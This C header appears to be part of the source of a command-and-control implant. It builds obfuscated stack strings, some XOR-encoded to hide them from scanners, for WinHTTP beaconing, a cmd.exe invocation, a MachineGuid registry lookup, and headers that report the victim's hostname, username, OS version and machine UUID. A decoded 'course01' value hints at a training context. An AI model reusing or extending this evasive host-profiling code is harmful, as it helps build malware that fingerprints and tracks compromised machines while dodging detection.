#pragma once
#include "types.h"
#include "wintypes.h"
#include "protocol.h"

#define STRLEN_BYTES_WINHTTP 22
#define STACKSTR_KEY_HASH 0x4E
#define STACKSTR_KEY_GETW 0x7A

static inline VOID StrWinhttp(PWCHAR buf)
{
    *(volatile WCHAR *)&buf[0] = L'w'; // w
    *(volatile WCHAR *)&buf[1] = L'i'; // i
    *(volatile WCHAR *)&buf[2] = L'n'; // n
    *(volatile WCHAR *)&buf[3] = L'h'; // h
    *(volatile WCHAR *)&buf[4] = L't'; // t
    *(volatile WCHAR *)&buf[5] = L't'; // t
    *(volatile WCHAR *)&buf[6] = L'p'; // p
    *(volatile WCHAR *)&buf[7] = L'.'; // .
    *(volatile WCHAR *)&buf[8] = L'd'; // d
    *(volatile WCHAR *)&buf[9] = L'l'; // l
    *(volatile WCHAR *)&buf[10] = L'l'; // l
    *(volatile WCHAR *)&buf[11] = L'\0'; // null terminator
}

static inline VOID StrUserAgent(PWCHAR buf)
{
    *(volatile WCHAR *)&buf[0] = L'm'; // M
    *(volatile WCHAR *)&buf[1] = L'i'; // i
    *(volatile WCHAR *)&buf[2] = L'n'; // n
    *(volatile WCHAR *)&buf[3] = L'i'; // i
    *(volatile WCHAR *)&buf[4] = L'm'; // m
    *(volatile WCHAR *)&buf[5] = L'a'; // a
    *(volatile WCHAR *)&buf[6] = L'l'; // l
    *(volatile WCHAR *)&buf[7] = L'_'; //_
    *(volatile WCHAR *)&buf[8] = L'a'; // a
    *(volatile WCHAR *)&buf[9] = L'g'; // g
    *(volatile WCHAR *)&buf[10] = L'e'; // e
    *(volatile WCHAR *)&buf[11] = L'n'; // n
    *(volatile WCHAR *)&buf[12] = L't'; // t
    *(volatile WCHAR *)&buf[13] = L'/'; // /
    *(volatile WCHAR *)&buf[14] = L'1'; // 1
    *(volatile WCHAR *)&buf[15] = L'.'; // .
    *(volatile WCHAR *)&buf[16] = L'0'; // 0
    *(volatile WCHAR *)&buf[17] = L'\0'; // null terminator
}



static inline VOID StrCmdline(PWCHAR buf)
{
    *(volatile WCHAR *)&buf[0] = L'c'; 
    *(volatile WCHAR *)&buf[1] = L'm'; 
    *(volatile WCHAR *)&buf[2] = L'd'; 
    *(volatile WCHAR *)&buf[3] = L'.'; 
    *(volatile WCHAR *)&buf[4] = L'e';
    *(volatile WCHAR *)&buf[5] = L'x';
    *(volatile WCHAR *)&buf[6] = L'e';
    *(volatile WCHAR *)&buf[7] = L' ';
    *(volatile WCHAR *)&buf[8] = L'/';
    *(volatile WCHAR *)&buf[9] = L'K';
    *(volatile WCHAR *)&buf[10] = L' '; 
    *(volatile WCHAR *)&buf[11] = L'c';
    *(volatile WCHAR *)&buf[12] = L'h';
    *(volatile WCHAR *)&buf[13] = L'c';
    *(volatile WCHAR *)&buf[14] = L'p';
    *(volatile WCHAR *)&buf[15] = L' ';
    *(volatile WCHAR *)&buf[16] = L'6';
    *(volatile WCHAR *)&buf[17] = L'5';
    *(volatile WCHAR *)&buf[18] = L'0';
    *(volatile WCHAR *)&buf[19] = L'0';
    *(volatile WCHAR *)&buf[20] = L'1';
    *(volatile WCHAR *)&buf[21] = L' ';
    *(volatile WCHAR *)&buf[22] = L'>';
    *(volatile WCHAR *)&buf[23] = L'n';
    *(volatile WCHAR *)&buf[24] = L'u';
    *(volatile WCHAR *)&buf[25] = L'l';
    *(volatile WCHAR *)&buf[26] = L'\0';
}


static inline VOID StrRegPath(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] ='S';
    *(volatile CHAR *)&buf[1] = 'O';
    *(volatile CHAR *)&buf[2] = 'F';
    *(volatile CHAR *)&buf[3] = 'T';
    *(volatile CHAR *)&buf[4] = 'W';
    *(volatile CHAR *)&buf[5] = 'A';
    *(volatile CHAR *)&buf[6] = 'R';
    *(volatile CHAR *)&buf[7] = 'E';
    *(volatile CHAR *)&buf[8] = '\\';
    *(volatile CHAR *)&buf[9] = 'M';
    *(volatile CHAR *)&buf[10] = 'i';
    *(volatile CHAR *)&buf[11] = 'c';
    *(volatile CHAR *)&buf[12] = 'r';
    *(volatile CHAR *)&buf[13] = 'o';
    *(volatile CHAR *)&buf[14] = 's';
    *(volatile CHAR *)&buf[15] = 'o';
    *(volatile CHAR *)&buf[16] = 'f';
    *(volatile CHAR *)&buf[17] = 't';
    *(volatile CHAR *)&buf[18] = '\\';
    *(volatile CHAR *)&buf[19] = 'C';
    *(volatile CHAR *)&buf[20] = 'r';
    *(volatile CHAR *)&buf[21] = 'y';
    *(volatile CHAR *)&buf[22] = 'p';
    *(volatile CHAR *)&buf[23] = 't';
    *(volatile CHAR *)&buf[24] = 'o';
    *(volatile CHAR *)&buf[25] = 'g';
    *(volatile CHAR *)&buf[26] = 'r';
    *(volatile CHAR *)&buf[27] = 'a';
    *(volatile CHAR *)&buf[28] = 'p';
    *(volatile CHAR *)&buf[29] = 'h';
    *(volatile CHAR *)&buf[30] = 'y';
    *(volatile CHAR *)&buf[31] = 0;
}

static inline VOID StrMachineGuid(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'M';
    *(volatile CHAR *)&buf[1] = 'a';
    *(volatile CHAR *)&buf[2] = 'c';
    *(volatile CHAR *)&buf[3] = 'h';
    *(volatile CHAR *)&buf[4] = 'i';
    *(volatile CHAR *)&buf[5] = 'n';
    *(volatile CHAR *)&buf[6] = 'e';
    *(volatile CHAR *)&buf[7] = 'G';
    *(volatile CHAR *)&buf[8] = 'u';
    *(volatile CHAR *)&buf[9] = 'i';
    *(volatile CHAR *)&buf[10] = 'd';
    *(volatile CHAR *)&buf[11] = 0;
}

static inline VOID StrEnvUrl(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'W'; // W
    *(volatile CHAR *)&buf[1] = '_'; // _
    *(volatile CHAR *)&buf[2] = 'U'; // U
    *(volatile CHAR *)&buf[3] = 'R'; // R
    *(volatile CHAR *)&buf[4] = 'L'; // L
    *(volatile CHAR *)&buf[5] = '\0'; // null terminator
}

static inline VOID StrCommitDefault(PCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_HASH;
    *(volatile CHAR *)&buf[0] = (0x2Du ^ key);
    *(volatile CHAR *)&buf[1] = (0x21u ^ key);
    *(volatile CHAR *)&buf[2] = (0x3Bu ^ key);
    *(volatile CHAR *)&buf[3] = (0x3Cu ^ key);
    *(volatile CHAR *)&buf[4] = (0x3Du ^ key);
    *(volatile CHAR *)&buf[5] = (0x2Bu ^ key);
    *(volatile CHAR *)&buf[6] = (0x7Eu ^ key);
    *(volatile CHAR *)&buf[7] = (0x7Fu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[8] = 0;
}



static inline VOID StrGetMethodW(PWCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_GETW;
    *(volatile WCHAR *)&buf[0] = (0x3Du ^ key);
    *(volatile WCHAR *)&buf[1] = (0x3Fu ^ key);
    *(volatile WCHAR *)&buf[2] = (0x2Eu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[3] = 0;
}

static inline VOID StrHdrApiVersion(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'X';
    *(volatile CHAR *)&buf[1] = '-';
    *(volatile CHAR *)&buf[2] = 'A';
    *(volatile CHAR *)&buf[3] = 'g';
    *(volatile CHAR *)&buf[4] = 'e';
    *(volatile CHAR *)&buf[5] = 'n';
    *(volatile CHAR *)&buf[6] = 't';
    *(volatile CHAR *)&buf[7] = '-';
    *(volatile CHAR *)&buf[8] = 'A';
    *(volatile CHAR *)&buf[9] = 'p';
    *(volatile CHAR *)&buf[10] = 'i';
    *(volatile CHAR *)&buf[11] = '-';
    *(volatile CHAR *)&buf[12] = 'V';
    *(volatile CHAR *)&buf[13] = 'e';
    *(volatile CHAR *)&buf[14] = 'r';
    *(volatile CHAR *)&buf[15] = 's';
    *(volatile CHAR *)&buf[16] = 'i';
    *(volatile CHAR *)&buf[17] = 'o';
    *(volatile CHAR *)&buf[18] = 'n';
    *(volatile CHAR *)&buf[19] = ':';
    *(volatile CHAR *)&buf[20] = ' ';
    *(volatile CHAR *)&buf[21] = '0' + ID_API_VERSION;
    *(volatile CHAR *)&buf[22] = '\r';
    *(volatile CHAR *)&buf[23] = '\n';
    *(volatile CHAR *)&buf[24] = 0;
}



static inline VOID StrHdrNameId(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'X';
    *(volatile CHAR *)&buf[1] = '-';
    *(volatile CHAR *)&buf[2] = 'A';
    *(volatile CHAR *)&buf[3] = 'g';
    *(volatile CHAR *)&buf[4] = 'e';
    *(volatile CHAR *)&buf[5] = 'n';
    *(volatile CHAR *)&buf[6] = 't';
    *(volatile CHAR *)&buf[7] = '-';
    *(volatile CHAR *)&buf[8] = 'N';
    *(volatile CHAR *)&buf[9] = 'a';
    *(volatile CHAR *)&buf[10] = 'm';
    *(volatile CHAR *)&buf[11] = 'e';
    *(volatile CHAR *)&buf[12] = '-';
    *(volatile CHAR *)&buf[13] = 'I';
    *(volatile CHAR *)&buf[14] = 'd';
    *(volatile CHAR *)&buf[15] = ':';
    *(volatile CHAR *)&buf[16] =  ' ';
    *(volatile CHAR *)&buf[17] = '0' + ID_AGENT_NAME_ID;
    *(volatile CHAR *)&buf[18] = '\r';
    *(volatile CHAR *)&buf[19] = '\n';
    *(volatile CHAR *)&buf[20] = 0;
}

static inline VOID StrHdrPlatform(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'X';
    *(volatile CHAR *)&buf[1] = '-';
    *(volatile CHAR *)&buf[2] =  'A';
    *(volatile CHAR *)&buf[3] = 'g';
    *(volatile CHAR *)&buf[4] = 'e';
    *(volatile CHAR *)&buf[5] = 'n';
    *(volatile CHAR *)&buf[6] = 't';
    *(volatile CHAR *)&buf[7] = '-';
    *(volatile CHAR *)&buf[8] = 'P';
    *(volatile CHAR *)&buf[9] = 'l';
    *(volatile CHAR *)&buf[10] = 'a';
    *(volatile CHAR *)&buf[11] = 't';
    *(volatile CHAR *)&buf[12] = 'f';
    *(volatile CHAR *)&buf[13] = 'o';
    *(volatile CHAR *)&buf[14] = 'r';
    *(volatile CHAR *)&buf[15] = 'm';
    *(volatile CHAR *)&buf[16] = ':';
    *(volatile CHAR *)&buf[17] = ' ';
    *(volatile CHAR *)&buf[18] = 'w';
    *(volatile CHAR *)&buf[19] = 'i';
    *(volatile CHAR *)&buf[20] = 'n';
    *(volatile CHAR *)&buf[21] = 'd';
    *(volatile CHAR *)&buf[22] = 'o';
    *(volatile CHAR *)&buf[23] = 'w';
    *(volatile CHAR *)&buf[24] = 's';
    *(volatile CHAR *)&buf[25] = '\r';
    *(volatile CHAR *)&buf[26] = '\n';
    *(volatile CHAR *)&buf[27] = 0;
}
// "X-Agent-Capabilities: 0100000000000000\r\n"
static inline VOID StrHdrCaps(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'X';
    *(volatile CHAR *)&buf[1] = '-';
    *(volatile CHAR *)&buf[2] = 'A';
    *(volatile CHAR *)&buf[3] = 'g';
    *(volatile CHAR *)&buf[4] = 'e';
    *(volatile CHAR *)&buf[5] = 'n';
    *(volatile CHAR *)&buf[6] = 't';
    *(volatile CHAR *)&buf[7] = '-';
    *(volatile CHAR *)&buf[8] = 'C';
    *(volatile CHAR *)&buf[9] = 'a';
    *(volatile CHAR *)&buf[10] = 'p';
    *(volatile CHAR *)&buf[11] = 'a';
    *(volatile CHAR *)&buf[12] = 'b';
    *(volatile CHAR *)&buf[13] = 'i';
    *(volatile CHAR *)&buf[14] = 'l';
    *(volatile CHAR *)&buf[15] = 'i';
    *(volatile CHAR *)&buf[16] = 't';
    *(volatile CHAR *)&buf[17] = 'i';
    *(volatile CHAR *)&buf[18] = 'e';
    *(volatile CHAR *)&buf[19] = 's';
    *(volatile CHAR *)&buf[20] = ':';
    *(volatile CHAR *)&buf[21] = ' ';
    *(volatile CHAR *)&buf[22] = '0';
    *(volatile CHAR *)&buf[23] = '1';
    *(volatile CHAR *)&buf[24] = '0';
    *(volatile CHAR *)&buf[25] = '0';
    *(volatile CHAR *)&buf[26] = '0';
    *(volatile CHAR *)&buf[27] = '0';
    *(volatile CHAR *)&buf[28] = '0';
    *(volatile CHAR *)&buf[29] = '0';
    *(volatile CHAR *)&buf[30] = '0';
    *(volatile CHAR *)&buf[31] = '0';
    *(volatile CHAR *)&buf[32] = '0';
    *(volatile CHAR *)&buf[33] = '0';
    *(volatile CHAR *)&buf[34] = '0';
    *(volatile CHAR *)&buf[35] = '0';
    *(volatile CHAR *)&buf[36] = '0';
    *(volatile CHAR *)&buf[37] = '0';
    *(volatile CHAR *)&buf[38] = '0';
    *(volatile CHAR *)&buf[39] = '0';
    *(volatile CHAR *)&buf[40] = '\r';
    *(volatile CHAR *)&buf[41] = '\n';
    *(volatile CHAR *)&buf[42] = 0;
}

//"X-Agent-Machine-Uuid: "
static inline VOID StrLblUuid(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'X';
    *(volatile CHAR *)&buf[1] = '-';
    *(volatile CHAR *)&buf[2] = 'A';
    *(volatile CHAR *)&buf[3] = 'g';
    *(volatile CHAR *)&buf[4] = 'e';
    *(volatile CHAR *)&buf[5] = 'n';
    *(volatile CHAR *)&buf[6] = 't';
    *(volatile CHAR *)&buf[7] = '-';
    *(volatile CHAR *)&buf[8] = 'M';
    *(volatile CHAR *)&buf[9] = 'a';
    *(volatile CHAR *)&buf[10] = 'c';
    *(volatile CHAR *)&buf[11] = 'h';
    *(volatile CHAR *)&buf[12] = 'i';
    *(volatile CHAR *)&buf[13] = 'n';
    *(volatile CHAR *)&buf[14] = 'e';
    *(volatile CHAR *)&buf[15] = '-';
    *(volatile CHAR *)&buf[16] = 'U';
    *(volatile CHAR *)&buf[17] = 'u';
    *(volatile CHAR *)&buf[18] = 'i';
    *(volatile CHAR *)&buf[19] = 'd';
    *(volatile CHAR *)&buf[20] = ':';
    *(volatile CHAR *)&buf[21] = ' ';
    *(volatile CHAR *)&buf[22] = 0;
}

static inline VOID StrLblHostname(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'X';
    *(volatile CHAR *)&buf[1] = '-';
    *(volatile CHAR *)&buf[2] = 'A';
    *(volatile CHAR *)&buf[3] = 'g';
    *(volatile CHAR *)&buf[4] = 'e';
    *(volatile CHAR *)&buf[5] = 'n';
    *(volatile CHAR *)&buf[6] = 't';
    *(volatile CHAR *)&buf[7] = '-';
    *(volatile CHAR *)&buf[8] = 'H';
    *(volatile CHAR *)&buf[9] = 'o';
    *(volatile CHAR *)&buf[10] = 's';
    *(volatile CHAR *)&buf[11] = 't';
    *(volatile CHAR *)&buf[12] = 'n';
    *(volatile CHAR *)&buf[13] = 'a';
    *(volatile CHAR *)&buf[14] = 'm';
    *(volatile CHAR *)&buf[15] = 'e';
    *(volatile CHAR *)&buf[16] = ':';
    *(volatile CHAR *)&buf[17] = ' ';
    *(volatile CHAR *)&buf[18] = 0;
}

static inline VOID StrLblUsername(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'X';
    *(volatile CHAR *)&buf[1] = '-';
    *(volatile CHAR *)&buf[2] = 'A';
    *(volatile CHAR *)&buf[3] = 'g';
    *(volatile CHAR *)&buf[4] = 'e';
    *(volatile CHAR *)&buf[5] = 'n';
    *(volatile CHAR *)&buf[6] = 't';
    *(volatile CHAR *)&buf[7] = '-';
    *(volatile CHAR *)&buf[8] = 'U';
    *(volatile CHAR *)&buf[9] = 's';
    *(volatile CHAR *)&buf[10] = 'e';
    *(volatile CHAR *)&buf[11] = 'r';
    *(volatile CHAR *)&buf[12] = 'n';
    *(volatile CHAR *)&buf[13] = 'a';
    *(volatile CHAR *)&buf[14] = 'm';
    *(volatile CHAR *)&buf[15] = 'e';
    *(volatile CHAR *)&buf[16] = ':';
    *(volatile CHAR *)&buf[17] = ' ';
    *(volatile CHAR *)&buf[18] = 0;
}

static inline VOID StrLblOsVersion(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'X';
    *(volatile CHAR *)&buf[1] = '-';
    *(volatile CHAR *)&buf[2] = 'A';
    *(volatile CHAR *)&buf[3] = 'g';
    *(volatile CHAR *)&buf[4] = 'e';
    *(volatile CHAR *)&buf[5] = 'n';
    *(volatile CHAR *)&buf[6] = 't';
    *(volatile CHAR *)&buf[7] = '-';
    *(volatile CHAR *)&buf[8] = 'O';
    *(volatile CHAR *)&buf[9] = 's';
    *(volatile CHAR *)&buf[10] = '-';
    *(volatile CHAR *)&buf[11] = 'V';
    *(volatile CHAR *)&buf[12] = 'e';
    *(volatile CHAR *)&buf[13] = 'r';
    *(volatile CHAR *)&buf[14] = 's';
    *(volatile CHAR *)&buf[15] = 'i';
    *(volatile CHAR *)&buf[16] = 'o';
    *(volatile CHAR *)&buf[17] = 'n';
    *(volatile CHAR *)&buf[18] = ':';
    *(volatile CHAR *)&buf[19] = ' ';
    *(volatile CHAR *)&buf[20] = 0;
}

// "X-Agent-Build: ""
static inline VOID StrLblBuild(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'X';
    *(volatile CHAR *)&buf[1] = '-';
    *(volatile CHAR *)&buf[2] = 'A';
    *(volatile CHAR *)&buf[3] = 'g';
    *(volatile CHAR *)&buf[4] = 'e';
    *(volatile CHAR *)&buf[5] = 'n';
    *(volatile CHAR *)&buf[6] = 't';
    *(volatile CHAR *)&buf[7] = '-';
    *(volatile CHAR *)&buf[8] = 'B';
    *(volatile CHAR *)&buf[9] = 'u';
    *(volatile CHAR *)&buf[10] = 'i';
    *(volatile CHAR *)&buf[11] = 'l';
    *(volatile CHAR *)&buf[12] = 'd';
    *(volatile CHAR *)&buf[13] = ':';
    *(volatile CHAR *)&buf[14] = ' ';
    *(volatile CHAR *)&buf[15] = 0;
}

static inline VOID StrLblCommit(PCHAR buf)
{
    volatile UINT32 key = 0x5B;
    *(volatile CHAR *)&buf[0] = (0x03u ^ key);
    *(volatile CHAR *)&buf[1] = (0x76u ^ key);
    *(volatile CHAR *)&buf[2] = (0x1Au ^ key);
    *(volatile CHAR *)&buf[3] = (0x3Cu ^ key);
    *(volatile CHAR *)&buf[4] = (0x3Eu ^ key);
    *(volatile CHAR *)&buf[5] = (0x35u ^ key);
    *(volatile CHAR *)&buf[6] = (0x2Fu ^ key);
    *(volatile CHAR *)&buf[7] = (0x76u ^ key);
    *(volatile CHAR *)&buf[8] = (0x18u ^ key);
    *(volatile CHAR *)&buf[9] = (0x34u ^ key);
    *(volatile CHAR *)&buf[10] = (0x36u ^ key);
    *(volatile CHAR *)&buf[11] = (0x36u ^ key);
    *(volatile CHAR *)&buf[12] = (0x32u ^ key);
    *(volatile CHAR *)&buf[13] = (0x2Fu ^ key);
    *(volatile CHAR *)&buf[14] = (0x61u ^ key);
    *(volatile CHAR *)&buf[15] = (0x7Bu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[16] = 0;
}

static inline VOID StrValArchX64(PCHAR buf)
{
    volatile UINT32 key = 0x24;
    *(volatile CHAR *)&buf[0] = (0x7Cu ^ key);
    *(volatile CHAR *)&buf[1] = (0x09u ^ key);
    *(volatile CHAR *)&buf[2] = (0x65u ^ key);
    *(volatile CHAR *)&buf[3] = (0x43u ^ key);
    *(volatile CHAR *)&buf[4] = (0x41u ^ key);
    *(volatile CHAR *)&buf[5] = (0x4Au ^ key);
    *(volatile CHAR *)&buf[6] = (0x50u ^ key);
    *(volatile CHAR *)&buf[7] = (0x09u ^ key);
    *(volatile CHAR *)&buf[8] = (0x65u ^ key);
    *(volatile CHAR *)&buf[9] = (0x56u ^ key);
    *(volatile CHAR *)&buf[10] = (0x47u ^ key);
    *(volatile CHAR *)&buf[11] = (0x4Cu ^ key);
    *(volatile CHAR *)&buf[12] = (0x1Eu ^ key);
    *(volatile CHAR *)&buf[13] = (0x04u ^ key);
    *(volatile CHAR *)&buf[14] = (0x5Cu ^ key);
    *(volatile CHAR *)&buf[15] = (0x1Cu ^ key);
    *(volatile CHAR *)&buf[16] = (0x12u ^ key);
    *(volatile CHAR *)&buf[17] = (0x7Bu ^ key);
    *(volatile CHAR *)&buf[18] = (0x12u ^ key);
    *(volatile CHAR *)&buf[19] = (0x10u ^ key);
    *(volatile CHAR *)&buf[20] = (0x29u ^ key);
    *(volatile CHAR *)&buf[21] = (0x2Eu ^ key);
    *(volatile CHAR *)&buf[22] = (0x7Cu ^ key);
    *(volatile CHAR *)&buf[23] = (0x09u ^ key);
    *(volatile CHAR *)&buf[24] = (0x65u ^ key);
    *(volatile CHAR *)&buf[25] = (0x43u ^ key);
    *(volatile CHAR *)&buf[26] = (0x41u ^ key);
    *(volatile CHAR *)&buf[27] = (0x4Au ^ key);
    *(volatile CHAR *)&buf[28] = (0x50u ^ key);
    *(volatile CHAR *)&buf[29] = (0x09u ^ key);
    *(volatile CHAR *)&buf[30] = (0x74u ^ key);
    *(volatile CHAR *)&buf[31] = (0x56u ^ key);
    *(volatile CHAR *)&buf[32] = (0x4Bu ^ key);
    *(volatile CHAR *)&buf[33] = (0x47u ^ key);
    *(volatile CHAR *)&buf[34] = (0x41u ^ key);
    *(volatile CHAR *)&buf[35] = (0x57u ^ key);
    *(volatile CHAR *)&buf[36] = (0x57u ^ key);
    *(volatile CHAR *)&buf[37] = (0x09u ^ key);
    *(volatile CHAR *)&buf[38] = (0x65u ^ key);
    *(volatile CHAR *)&buf[39] = (0x56u ^ key);
    *(volatile CHAR *)&buf[40] = (0x47u ^ key);
    *(volatile CHAR *)&buf[41] = (0x4Cu ^ key);
    *(volatile CHAR *)&buf[42] = (0x1Eu ^ key);
    *(volatile CHAR *)&buf[43] = (0x04u ^ key);
    *(volatile CHAR *)&buf[44] = (0x5Cu ^ key);
    *(volatile CHAR *)&buf[45] = (0x1Cu ^ key);
    *(volatile CHAR *)&buf[46] = (0x12u ^ key);
    *(volatile CHAR *)&buf[47] = (0x7Bu ^ key);
    *(volatile CHAR *)&buf[48] = (0x12u ^ key);
    *(volatile CHAR *)&buf[49] = (0x10u ^ key);
    *(volatile CHAR *)&buf[50] = (0x29u ^ key);
    *(volatile CHAR *)&buf[51] = (0x2Eu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[52] = 0;
}

static inline VOID StrValArchI386(PCHAR buf)
{
    volatile UINT32 key = 0x37;
    *(volatile CHAR *)&buf[0] = (0x6Fu ^ key);
    *(volatile CHAR *)&buf[1] = (0x1Au ^ key);
    *(volatile CHAR *)&buf[2] = (0x76u ^ key);
    *(volatile CHAR *)&buf[3] = (0x50u ^ key);
    *(volatile CHAR *)&buf[4] = (0x52u ^ key);
    *(volatile CHAR *)&buf[5] = (0x59u ^ key);
    *(volatile CHAR *)&buf[6] = (0x43u ^ key);
    *(volatile CHAR *)&buf[7] = (0x1Au ^ key);
    *(volatile CHAR *)&buf[8] = (0x76u ^ key);
    *(volatile CHAR *)&buf[9] = (0x45u ^ key);
    *(volatile CHAR *)&buf[10] = (0x54u ^ key);
    *(volatile CHAR *)&buf[11] = (0x5Fu ^ key);
    *(volatile CHAR *)&buf[12] = (0x0Du ^ key);
    *(volatile CHAR *)&buf[13] = (0x17u ^ key);
    *(volatile CHAR *)&buf[14] = (0x5Eu ^ key);
    *(volatile CHAR *)&buf[15] = (0x04u ^ key);
    *(volatile CHAR *)&buf[16] = (0x0Fu ^ key);
    *(volatile CHAR *)&buf[17] = (0x01u ^ key);
    *(volatile CHAR *)&buf[18] = (0x3Au ^ key);
    *(volatile CHAR *)&buf[19] = (0x3Du ^ key);
    *(volatile CHAR *)&buf[20] = (0x6Fu ^ key);
    *(volatile CHAR *)&buf[21] = (0x1Au ^ key);
    *(volatile CHAR *)&buf[22] = (0x76u ^ key);
    *(volatile CHAR *)&buf[23] = (0x50u ^ key);
    *(volatile CHAR *)&buf[24] = (0x52u ^ key);
    *(volatile CHAR *)&buf[25] = (0x59u ^ key);
    *(volatile CHAR *)&buf[26] = (0x43u ^ key);
    *(volatile CHAR *)&buf[27] = (0x1Au ^ key);
    *(volatile CHAR *)&buf[28] = (0x67u ^ key);
    *(volatile CHAR *)&buf[29] = (0x45u ^ key);
    *(volatile CHAR *)&buf[30] = (0x58u ^ key);
    *(volatile CHAR *)&buf[31] = (0x54u ^ key);
    *(volatile CHAR *)&buf[32] = (0x52u ^ key);
    *(volatile CHAR *)&buf[33] = (0x44u ^ key);
    *(volatile CHAR *)&buf[34] = (0x44u ^ key);
    *(volatile CHAR *)&buf[35] = (0x1Au ^ key);
    *(volatile CHAR *)&buf[36] = (0x76u ^ key);
    *(volatile CHAR *)&buf[37] = (0x45u ^ key);
    *(volatile CHAR *)&buf[38] = (0x54u ^ key);
    *(volatile CHAR *)&buf[39] = (0x5Fu ^ key);
    *(volatile CHAR *)&buf[40] = (0x0Du ^ key);
    *(volatile CHAR *)&buf[41] = (0x17u ^ key);
    *(volatile CHAR *)&buf[42] = (0x5Eu ^ key);
    *(volatile CHAR *)&buf[43] = (0x04u ^ key);
    *(volatile CHAR *)&buf[44] = (0x0Fu ^ key);
    *(volatile CHAR *)&buf[45] = (0x01u ^ key);
    *(volatile CHAR *)&buf[46] = (0x3Au ^ key);
    *(volatile CHAR *)&buf[47] = (0x3Du ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[48] = 0;
}

static inline VOID StrValArchArm64(PCHAR buf)
{
    volatile UINT32 key = 0x35;
    *(volatile CHAR *)&buf[0] = (0x6Du ^ key);
    *(volatile CHAR *)&buf[1] = (0x18u ^ key);
    *(volatile CHAR *)&buf[2] = (0x74u ^ key);
    *(volatile CHAR *)&buf[3] = (0x52u ^ key);
    *(volatile CHAR *)&buf[4] = (0x50u ^ key);
    *(volatile CHAR *)&buf[5] = (0x5Bu ^ key);
    *(volatile CHAR *)&buf[6] = (0x41u ^ key);
    *(volatile CHAR *)&buf[7] = (0x18u ^ key);
    *(volatile CHAR *)&buf[8] = (0x74u ^ key);
    *(volatile CHAR *)&buf[9] = (0x47u ^ key);
    *(volatile CHAR *)&buf[10] = (0x56u ^ key);
    *(volatile CHAR *)&buf[11] = (0x5Du ^ key);
    *(volatile CHAR *)&buf[12] = (0x0Fu ^ key);
    *(volatile CHAR *)&buf[13] = (0x15u ^ key);
    *(volatile CHAR *)&buf[14] = (0x54u ^ key);
    *(volatile CHAR *)&buf[15] = (0x54u ^ key);
    *(volatile CHAR *)&buf[16] = (0x47u ^ key);
    *(volatile CHAR *)&buf[17] = (0x56u ^ key);
    *(volatile CHAR *)&buf[18] = (0x5Du ^ key);
    *(volatile CHAR *)&buf[19] = (0x03u ^ key);
    *(volatile CHAR *)&buf[20] = (0x01u ^ key);
    *(volatile CHAR *)&buf[21] = (0x38u ^ key);
    *(volatile CHAR *)&buf[22] = (0x3Fu ^ key);
    *(volatile CHAR *)&buf[23] = (0x6Du ^ key);
    *(volatile CHAR *)&buf[24] = (0x18u ^ key);
    *(volatile CHAR *)&buf[25] = (0x74u ^ key);
    *(volatile CHAR *)&buf[26] = (0x52u ^ key);
    *(volatile CHAR *)&buf[27] = (0x50u ^ key);
    *(volatile CHAR *)&buf[28] = (0x5Bu ^ key);
    *(volatile CHAR *)&buf[29] = (0x41u ^ key);
    *(volatile CHAR *)&buf[30] = (0x18u ^ key);
    *(volatile CHAR *)&buf[31] = (0x65u ^ key);
    *(volatile CHAR *)&buf[32] = (0x47u ^ key);
    *(volatile CHAR *)&buf[33] = (0x5Au ^ key);
    *(volatile CHAR *)&buf[34] = (0x56u ^ key);
    *(volatile CHAR *)&buf[35] = (0x50u ^ key);
    *(volatile CHAR *)&buf[36] = (0x46u ^ key);
    *(volatile CHAR *)&buf[37] = (0x46u ^ key);
    *(volatile CHAR *)&buf[38] = (0x18u ^ key);
    *(volatile CHAR *)&buf[39] = (0x74u ^ key);
    *(volatile CHAR *)&buf[40] = (0x47u ^ key);
    *(volatile CHAR *)&buf[41] = (0x56u ^ key);
    *(volatile CHAR *)&buf[42] = (0x5Du ^ key);
    *(volatile CHAR *)&buf[43] = (0x0Fu ^ key);
    *(volatile CHAR *)&buf[44] = (0x54u ^ key);
    *(volatile CHAR *)&buf[45] = (0x54u ^ key);
    *(volatile CHAR *)&buf[46] = (0x47u ^ key);
    *(volatile CHAR *)&buf[47] = (0x56u ^ key);
    *(volatile CHAR *)&buf[48] = (0x5Du ^ key);
    *(volatile CHAR *)&buf[49] = (0x03u ^ key);
    *(volatile CHAR *)&buf[50] = (0x01u ^ key);
    *(volatile CHAR *)&buf[51] = (0x38u ^ key);
    *(volatile CHAR *)&buf[52] = (0x3Fu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[53] = 0;
}